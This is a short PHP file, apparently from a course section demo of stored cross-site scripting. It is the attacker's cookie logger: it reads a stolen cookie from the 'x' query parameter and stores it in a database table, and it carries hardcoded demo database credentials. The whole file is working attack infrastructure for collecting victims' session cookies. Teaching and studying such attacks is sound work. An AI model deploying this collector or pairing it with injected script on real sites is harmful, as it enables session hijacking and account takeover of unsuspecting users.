<?php
/**********************************************************************
 * Stored Cross-Site Scripting attack, part 2
 * 
 * This file logs cookies for us. :)
 *
 **********************************************************************/

// database connection 
$dsn = 'mysql:host=localhost;dbname=jharvard_section8';
$db_user = 'jharvard';
$db_pass = 'crimson';
$dbh = new PDO($dsn, $db_user, $db_pass);

// handle database inserts
if (isset($_GET['x']))
{
    $stmt = $dbh->prepare('INSERT INTO cookies (cookie) VALUES (:cookie)');
    $stmt->bindValue(':cookie',$_GET['x']);
    $stmt->execute();
}
